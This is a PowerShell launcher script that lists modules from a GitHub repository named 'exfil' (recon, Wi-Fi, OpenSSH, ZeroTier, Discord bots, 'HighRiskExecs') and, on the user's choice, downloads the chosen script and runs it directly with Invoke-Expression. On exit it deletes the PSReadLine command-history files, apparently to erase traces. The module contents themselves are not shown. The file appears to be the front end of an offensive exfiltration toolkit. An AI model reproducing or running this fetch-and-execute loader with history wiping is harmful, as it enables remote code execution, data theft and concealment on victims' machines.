function Show-ActionMenu {
    param (
        [array] $Actions
    )
    while ($true) {
        Write-Host "Choose an action to execute or type 'q' to quit: " -ForegroundColor Yellow -BackgroundColor Black
        
        $index = 1
        foreach ($actionUrl in $Actions) {
            $fileName = [System.IO.Path]::GetFileName($actionUrl)
            Write-Host "$index. $fileName"
            $index++
        }
        $selectedActionIndex = $(Write-Host "Enter the number or type 'q' to quit: " -ForegroundColor Yellow -BackgroundColor Black -NoNewline; Read-Host)

        if ($selectedActionIndex -eq 'q') {
            Write-Host "Exiting..." -ForegroundColor Red
            # Add code to clear PSReadLine history
            $psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
            if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
                $files = Get-ChildItem -Path $psreadlineFolderPath
                if ($files.Count -gt 0) {
                    Remove-Item -Path "$psreadlineFolderPath\*" -Force
                }
            }
            break
        }
        $selectedActionIndex = [int]$selectedActionIndex  # Cast input to an integer
        if ($selectedActionIndex -ge 1 -and $selectedActionIndex -le $Actions.Count) {
            $selectedUrl = $Actions[$selectedActionIndex - 1]
            $selectedAction = [System.IO.Path]::GetFileNameWithoutExtension($selectedUrl)
            Write-Host "You chose: $selectedAction" -ForegroundColor Green -BackgroundColor Black
            
            $urlContent = (Invoke-WebRequest -Uri $selectedUrl -UseBasicParsing).Content
            Invoke-Expression $urlContent
        }
        else {
            Write-Host "Invalid selection. Please choose a valid number or type 'q' to quit: " -ForegroundColor Red -BackgroundColor Black
        }
    }
}
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol
}
$actions = @(
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Archives/ArchivesLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/CoreFunctions/CoreFunctionsLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/DiscordBots/DiscordBotsLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/GlobalFilesLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Miscellaneous/MiscellaneousLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/OpenSSHStuff/OpenSSHStuffLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Recon/ReconLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/SanitationLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/WifiRelated/WifiRelatedLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZeroTierStuffLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/SanitationLedger.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/HighRiskExecs/HighRiskExecsLedger.ps1"
        
)
# Call the function to display the action menu and execute the selected action or quit
Show-ActionMenu -Actions $actions
